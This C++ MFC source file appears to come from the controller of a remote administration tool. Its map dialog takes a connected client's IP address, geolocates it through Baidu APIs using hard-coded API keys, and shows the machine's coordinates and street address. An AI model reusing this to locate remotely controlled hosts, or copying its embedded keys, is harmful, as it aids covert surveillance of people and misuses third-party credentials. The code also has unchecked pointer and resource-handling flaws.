// MapDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "MapDlg.h"
#include "PcView.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMapDlg dialog


CMapDlg::CMapDlg(CWnd* pParent /*=NULL*/,ClientContext *pContext)
	: CDialog(CMapDlg::IDD, pParent)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_MAP));
	//{{AFX_DATA_INIT(CMapDlg)
	m_1 = _T("");
	m_3 = _T("");
	//}}AFX_DATA_INIT
	m_pContext = pContext;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

}


void CMapDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMapDlg)
	DDX_Text(pDX, IDC_STATIC_1, m_1);
	DDX_Text(pDX, IDC_STATIC_3, m_3);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMapDlg, CDialog)
	//{{AFX_MSG_MAP(CMapDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMapDlg message handlers
#include <afxwin.h>
#include <afxinet.h>
BOOL GetUpdateInfo(char * strText , char * szurl, char *szstart ,char * szstop)
{
	BOOL bRet = FALSE;
	CString myData;
	char *ip_start = NULL;
	CInternetSession mySession(NULL,0);
	CHttpFile* ChinazHttpFile = NULL;
	ChinazHttpFile = 	(CHttpFile*)mySession.OpenURL(szurl);//str是要打开的地址  
	while(ChinazHttpFile->ReadString(myData)) 		//逐行读取页面数据   
	{
 		if(strstr(myData,szstop)!= 0)
		{
			char  *ip_stop=strstr(myData,szstop);//IP端尾部指针赋值
			*ip_stop='\0';//截断
			
			ip_start=strstr(myData,szstart)+lstrlen(szstart);//ip段开始部分指针赋值
			
			lstrcpy(strText,ip_start);
			
			bRet = TRUE;
			break;
		}
	}
	
	return bRet;
}
CString CMapDlg::htmlmap()
{
	CString html;
	html+="<!doctype html>  \r\n";
	html+="<html>  \r\n";
	html+="<head>  \r\n";
	html+="<meta name=\"viewport\" content=\"initial-scale=1.0, user-scalable=no\" />  \r\n";
	html+="<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\" />  \r\n";
	html+="<title>Baidu Map</title>  \r\n";
	html+="<script type=\"text/javascript\" src=\"http://api.map.baidu.com/api?v=2.0&ak=eqI5HOpUOa8ZEo9F0ipAkGQa\">  \r\n";
	html+="<!-- add baidu map api -->  \r\n";
	html+="</script>  \r\n";
	html+="</head>  \r\n";
	html+="<body>  \r\n";
	html+="<div id=\"container\"   style=\"position: absolute;margin-top:0px; width: 629px; height: 387px; top: 0; border: 0px solid gray;                overflow:hidden;\">	 \r\n";
	html+="</div>\r\n";
	html+="</body>  \r\n";
	html+="</html>  \r\n";
	html+="<script type=\"text/javascript\">  \r\n";
	html+="var map = new BMap.Map(\"container\");                    // new Map\r\n";
    html+="var point = new BMap.Point( " +  m_x + "," + m_y + "); \r\n";
    html+="map.centerAndZoom(point, 2);                           // show Map\r\n";
	html+="map.setZoom(14);   \r\n";
    html+="var mark = new BMap.Marker(point);\r\n";
    html+="map.addOverlay(mark);\r\n";
	
	
	html+="map.addEventListener(\"dbclick\", function (e) \r\n";
	html+="{\r\n";
	html+="alert(e.point.lng + "  "+ e.point.lat);\r\n";
	html+="}\r\n";
	html+=");\r\n";
	html+="map.enableContinuousZoom();    //启用地图惯性拖拽，默认禁用\r\n";

    html+="map.addControl(new BMap.MapTypeControl());\r\n";   //添加地图类型控件
    // 添加缩放功能  
    html+="map.enableScrollWheelZoom();\r\n";
    html+="map.enableKeyboard();\r\n";
    html+="map.addControl(new BMap.OverviewMapControl()); //为地图添加鹰眼控件\r\n";
    //map.addControl(new BMap.OverviewMapControl({ isOpen: 1 })); //开启鹰眼
    html+="map.addControl(new BMap.NavigationControl()); //为地图添加鱼骨（默认）\r\n";
    // map.addControl(new BMap.ScaleControl()); //为地图添加比例尺
    html+="map.addControl(new BMap.ScaleControl({ offset: new BMap.Size(5, 40) })); //添加一个带上偏移量的比例尺\r\n";
	html+="map.addControl(new BMap.PanoramaControl({offset:new BMap.Size(20, 40)})); //为地图添加全景\r\n";
    html+="map.addControl(new BMap.MapTypeControl());\r\n";
	html+="</script> \r\n";
	html+="<html>\r\n";
	
	return html;
}

extern 	SEU_QQwry *m_QQwry;

int ConvUtf8ToAnsi(CString& strSource, CString& strChAnsi)
{  
    if (strSource.GetLength() <= 0)
        return 0;
    
    CString strWChUnicode;
	
    strSource.TrimLeft();
    strSource.TrimRight();   
    strChAnsi.Empty();
	
    int iLenByWChNeed = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(), //MultiByteToWideChar
		NULL, 0);
	
    int iLenByWchDone = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(),
		(LPWSTR)strWChUnicode.GetBuffer(iLenByWChNeed * 2),
		iLenByWChNeed); //MultiByteToWideChar
    
    strWChUnicode.ReleaseBuffer(iLenByWchDone * 2);
	
    int iLenByChNeed  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		NULL, 0,
		NULL, NULL); 
    
    int iLenByChDone  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		strChAnsi.GetBuffer(iLenByChNeed),
		iLenByChNeed,
		NULL, NULL);
	
    strChAnsi.ReleaseBuffer(iLenByChDone);
    
    if (iLenByWChNeed != iLenByWchDone || iLenByChNeed != iLenByChDone)
        return 1;
	
    return 0;   
}

BOOL CMapDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	VERIFY(m_page.CreateFromStatic(IDC_HTMLVIEW, this));

	CString str1;
	str1.Format("远程定位 -[%s]",m_IPAddress);
	SetWindowText(str1);

	if (m_IPAddress == "127.0.0.1")
	{
		MessageBox("不支持127.0.0.1定位...","温馨提示...",MB_ICONINFORMATION);
		CDialog::OnOK();
		return FALSE;
	}

	CString strUrl;
	strUrl.Format("http://api.map.baidu.com/location/ip?ak=eqI5HOpUOa8ZEo9F0ipAkGQa&ip=%s&coor=bd09ll",m_IPAddress);


	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"{\"x\":\"","\",\"y\":"))
		{
			m_x = strTitle;
		}

		memset(strTitle,0,sizeof(strTitle));
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"\",\"y\":\"" ,"\"}},\""))
		{
			m_y = strTitle;
		}
	}
	catch (...)
	{
		MessageBox("暂不不支持此IP定位...","温馨提示...",MB_ICONINFORMATION);
		CDialog::OnOK();
	}
	


	if (m_x =="" || m_y == "")
	{
		MessageBox("暂不不支持此IP定位...","温馨提示...",MB_ICONINFORMATION);
		CDialog::OnOK();
	}

	char szAppName[MAX_PATH];
	int  len;
	
	::GetModuleFileName(NULL, szAppName, sizeof(szAppName));
	len = strlen(szAppName);
	for(int i=len; i>0; i--)
	{
		if(szAppName[i] == '\\')
		{
			szAppName[i+1] = '\0';
			break;
		}
	}
	strcat(szAppName, "Plugins\\map.html");

	CFile file;
	
	if (file.Open(szAppName, CFile::modeWrite | CFile::modeCreate))
	{
		file.Write(htmlmap().GetBuffer(0),htmlmap().GetLength());
		file.Close();
	}
 
	CString str,stradress;
	strUrl.Format("http://api.map.baidu.com/geocoder/v2/?ak=rPtcdxiutc8Fi80QhXx7UDyD&callback=renderReverse&location=%s,%s&output=xml&pois=1",m_y,m_x);

	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"<formatted_address>","</formatted_address>"))
		{
			
			str = strTitle;
	    	ConvUtf8ToAnsi(str,stradress);
		}
		


	}
	catch (...)
	{
		AfxMessageBox("map error2");
	}

	str.Format("IP地址:【%s】 经度【%s】 纬度【%s】", m_IPAddress , m_x,m_y);
	m_1 = str;

	str.Format("地理位置:【%s】",stradress);
	m_3 = str;
	UpdateData(FALSE);

	m_page.Navigate2(szAppName);
	
	//界面居中显示
   this ->CenterWindow(CWnd::GetDesktopWindow());
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CMapDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	CDialog::OnOK();
}

